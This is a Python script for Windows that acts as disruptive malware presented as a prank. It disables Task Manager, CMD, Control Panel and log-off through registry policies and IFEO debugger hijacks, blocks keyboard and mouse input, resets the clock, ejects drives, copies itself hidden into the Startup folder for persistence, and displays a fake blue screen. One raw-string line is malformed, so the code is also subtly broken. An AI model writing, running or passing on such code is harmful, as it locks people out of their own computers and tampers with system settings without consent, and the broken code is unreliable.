import os, sys, ctypes, time, subprocess, threading, shutil
import winreg
try:
  import psutil; import pynput
except:
  try: subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil', 'pynput']); import psutil; import pynput
  except: pass
def run_cmd(c): subprocess.Popen(c, shell=True, creationflags=0x08000000)
def reg_mod(p, n, v, a):
  try:
    rm={'HKLM':winreg.HKEY_LOCAL_MACHINE,'HKCU':winreg.HKEY_CURRENT_USER}; rk=winreg.HKEY_CURRENT_USER; cp=p
    if chr(92) in p: px=p.split(chr(92))[0].upper(); rk=rm.get(px, rk); cp=chr(92).join(p.split(chr(92))[1:])
    cur = ''
    for pt in cp.split(chr(92)):
      cur = cur + chr(92) + pt if cur else pt
      try: winreg.CreateKeyEx(rk, cur, 0, winreg.KEY_WRITE | 256)
      except: pass
    k=winreg.OpenKey(rk, cp, 0, winreg.KEY_SET_VALUE | winreg.KEY_WRITE | 256)
    if a==1:
      if isinstance(v, str) and not v.isdigit(): winreg.SetValueEx(k, n, 0, winreg.REG_SZ, v)
      else: winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, int(v))
    else: winreg.DeleteValue(k, n)
    winreg.CloseKey(k)
  except: pass
def set_ifeo(e, v): reg_mod(r'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\'+e, 'Debugger', 'systray.exe', v)
p_expl = r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'; p_sys = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
p_cmd = r'Software\Policies\Microsoft\Windows\System'; p_hklm_sys = r'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
need_exp = False
kbd_listener = None; mouse_listener = None
def lock_keyboard(block):
  global kbd_listener
  try:
    if block:
      if not kbd_listener: kbd_listener = pynput.keyboard.Listener(suppress=True); kbd_listener.start()
    else:
      if kbd_listener: kbd_listener.stop(); kbd_listener = None
  except: pass
def lock_mouse(block):
  global mouse_listener
  try:
    if block:
      if not mouse_listener: mouse_listener = pynput.mouse.Listener(suppress=True); mouse_listener.start()
    else:
      if mouse_listener: mouse_listener.stop(); mouse_listener = None
  except: pass
def show_bsod(color, stop, txt, code, act):
  import tkinter as tk
  w = tk.Tk(); w.attributes('-fullscreen', True, '-topmost', True); w.config(bg=color, cursor='none')
  tk.Label(w, text=':(', font=('Segoe UI', 100), bg=color, fg='white').pack(anchor='w', padx=100, pady=(100, 20))
  tk.Label(w, text=txt.replace('\\n', chr(10)), font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  pv = tk.StringVar(value=chr(10)+'0% 完成'); tk.Label(w, textvariable=pv, font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  tk.Label(w, text=chr(10)+f'中止代碼: {code}', font=('Microsoft JhengHei', 14), bg=color, fg='white', justify='left').pack(anchor='w', padx=100, pady=40)
  def update(p):
    if p <= stop: pv.set(chr(10)+f'{p}% 完成'); w.after(100, update, p + 1)
    else:
      if '關閉' in act: w.destroy()
  w.after(100, update, 0); w.mainloop()
def set_auto_restore():
  r_cmd = 'cmd.exe /c reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies" /f & reg delete "HKCU\\Software\\Policies" /f & reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies" /f & reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\explorer.exe" /f & reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe" /f & reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe" /f'
  reg_mod(r'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'PandaPandaRestore', r_cmd, 1)
reg_mod('HKCU\\'+p_expl, 'NoControlPanel', 1, 1); set_ifeo('SystemSettings.exe', 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_cmd, 'DisableCMD', 2, 1); set_ifeo('cmd.exe', 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'NoDesktop', 1, 1); need_exp = True
set_auto_restore()
time.sleep(0.01)
hwnd = ctypes.windll.user32.FindWindowW('Shell_TrayWnd', None); ctypes.windll.user32.ShowWindow(hwnd, 0 if 1 == 1 else 5) if hwnd else 0
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_sys, 'DisableTaskMgr', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'NoClose', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'NoClose', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod(p_hklm_sys, 'HideFastUserSwitching', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'NoLogOff', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_sys, 'DisableLockWorkstation', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'HideClock', 1, 1)
set_auto_restore()
time.sleep(0.01)
reg_mod('HKCU\\'+p_expl, 'HideSCANetwork', 1, 1)
set_auto_restore()
time.sleep(0.01)
run_cmd('taskkill /f /im ctfmon.exe' if 1==1 else 'start ctfmon.exe')
set_auto_restore()
time.sleep(0.01)
lock_keyboard(True)
time.sleep(0.01)
lock_mouse(True)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
try:
  for _ in range(50): ctypes.windll.user32.keybd_event(0xAE, 0, 0, 0)
except: pass
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
run_cmd('net stop w32time'); run_cmd("powershell -WindowStyle Hidden -Command \"Set-Date -Date '2026-01-01 00:00:00'\"")
time.sleep(0.01)
ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None); run_cmd("powershell -WindowStyle Hidden -Command \"$s=New-Object -ComObject Shell.Application;$s.NameSpace(17).Items()|?{$_.Type -match '隨身碟|USB|Removable'}|%{$_.InvokeVerb('Eject')}\"")
time.sleep(0.01)
time.sleep(0.01)
sd = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
cf = os.path.abspath(sys.argv[0])
if not os.path.exists(sd): os.makedirs(sd)
for i in range(5):
  tf = os.path.join(sd, f'sys_guard_{i}.pyw')
  if cf.lower() != tf.lower():
    try:
      if os.path.exists(tf): ctypes.windll.kernel32.SetFileAttributesW(tf, 128); os.remove(tf)
      shutil.copy2(cf, tf); ctypes.windll.kernel32.SetFileAttributesW(tf, 2)
    except: pass
time.sleep(0.01)
show_bsod('#0078D7', 100, '您的電腦發生問題，必須重新啟動。\n收集錯誤資訊中...', 'CRITICAL_PROCESS_DIED', '藍屏後關閉')
time.sleep(0.01)
if need_exp: run_cmd('taskkill /f /im explorer.exe'); time.sleep(0.5); run_cmd('start explorer.exe')
